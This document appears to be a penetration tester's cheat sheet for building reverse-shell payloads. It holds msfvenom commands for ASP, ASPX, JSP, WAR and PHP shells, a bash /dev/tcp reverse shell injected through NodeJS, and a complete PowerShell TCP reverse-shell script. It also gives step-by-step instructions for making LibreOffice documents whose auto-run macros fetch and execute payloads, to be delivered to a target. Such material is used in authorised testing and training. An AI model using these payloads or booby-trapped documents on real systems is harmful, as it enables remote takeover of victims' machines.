#### asp
Is it IIS 5.1?

5.1
```bash - kali
cp /usr/share/webshells/asp/cmd-asp-5.1.asp .
```

![[Pasted image 20220614101904.png]]

OR

```bash - kali
cp /usr/share/webshells/asp/cmdasp.asp .
```

32 bit Stageless:
```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=443 -f asp > reverse86.asp
```

32 bit Staged:
```bash - kali
msfvenom -p windows/shell/reverse_tcp LHOST=$KALI LPORT=443 -f asp > reverse86.asp
```

64 bit Stageless:
```bash - kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f asp > reverse64.asp
```

64 bit Staged:
```bash - kali
msfvenom -p windows/x64/shell/reverse_tcp LHOST=$KALI LPORT=443 -f asp > reverse64.asp
```

#### aspx
```bash - kali
cp /usr/share/webshells/aspx/cmdasp.aspx .
```

32 bit Stageless:
```bash - kali
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=443 -f aspx > reverse86.aspx
```

32 bit Staged:
```bash - kali
msfvenom -p windows/shell/reverse_tcp LHOST=$KALI LPORT=443 -f aspx > reverse86.aspx
```

64 bit Stageless:
```bash - kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f aspx > reverse64.aspx
```

64 bit Staged:
```bash - kali
msfvenom -p windows/x64/shell/reverse_tcp LHOST=$KALI LPORT=443 -f aspx > reverse64.aspx
```

#### jsp	
```bash - kali
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=443 -f raw > reverse.jsp
```

#### jar / war
```bash - kali
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=443 -f war > reverse.war
```

Sometimes the jar itself will not work, we need to extract and upload one of its files:

```bash - kali
jar -xvf reverse.war
```

Now find and upload the .jsp file

#### NodeJS
```
echo "require('child_process').exec('bash -c \\'bash -i >& /dev/tcp/$KALI/443 0>&1\\''" > /var/www/node/package.js
```

#### php
```bash - kali
msfvenom -p php/reverse_php LHOST=$KALI LPORT=443 -f raw > reverse.php
```


#### .odt LibreOffice

save the following as Shelly.ps1
```
$client = New-Object System.Net.Sockets.TCPClient('$KALI',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```bash - kali
sudo apt install libreoffice-writer
```

Open LibreOffice Writer application.  start a new file, go to Tools > Macros > Organize Macros > basic.

select "FILE NAME" > New.  Name the Module.

```
REM  *****  BASIC  *****

Sub Main
	Shell("cmd /c powershell iwr http://$KALI/Shelly.ps1 -o %TEMP%/Shelly.ps1")
	Shell("cmd /c powershell -c %TEMP%/Shelly.ps1")
End Sub

```

**Save the document** as odt format.

We then need to make this macro run automatically when the document is opened.

Get out of the macro screen, back to the original file window.
go to Tools > customize > Events > Open Document > Macro >  double click "filename" > double click Standard > Select "macro name" > click OK > click OK

**Save file**

```bash - kali
chmod 755 Shelly.ps1
```

![[Python#Server]]

![[rlwrap]]

upload odt file.

#### .hta - .ods LibreOffice

```bash - kali
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=443 -f hta-psh -o evil.hta
```

Open the hta file, copy the "powershell.exe -nop -w hidden -e aQBmA...CQAcwApADsA"

```bash - kali
mousepad transform.py
```

Paste in place for the s variable.
```python
s = "powershell.exe -nop -w hidden -e aQBmA...CQAcwApADsA"

n = 50
for i in range(0, len(s), n):
    chunk = s[i:i + n]
    print('Str = Str + "' + chunk + '"')
```

```bash - kali
sudo apt install libreoffice-calc
```

start a new LibreOffice Calc file, go to Tools > Macros > Organize Macros > basic.

select "FILE NAME" > New.  Name the Module.  Paste in your generated to look like this:

==NOTICE HOW THIS STARTS WITH "cmd.exe /C ......."==

Make sure your Dim and Str's line up!

---

Sub Exploit

   Dim Str As String

   Str = Str + "cmd.exe /C powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
   Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
   Str = Str + "AUwAyAEIAMABLAEEAQQBBAD0AJwAnACkAKQApACwAWwBTAHkAc"
   Str = Str + "wB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgA"
   Str = Str + "uAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6A"
   ...
   Str = Str + "EQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQ"
   Str = Str + "AbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZ"
   Str = Str + "QBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJAB"
   Str = Str + "zAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPA"
   Str = Str + "HUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQ"
   Str = Str + "AbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAc"
   Str = Str + "wAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAB"
   Str = Str + "yAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnA"
   Str = Str + "G4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFM"
   Str = Str + "AdABhAHIAdAAoACQAcwApADsA"

   Shell(Str)

End Sub

---

**Save the document**

We then need to make this macro run automatically when the document is opened.

Get out of the macro screen, back to the original file window.
go to Tools > customize > Events > Open Document > Macro >  double click "filename" > double click Standard > Select "macro name" > click OK > click OK

Now just deliver the file and wait for it to be opened.
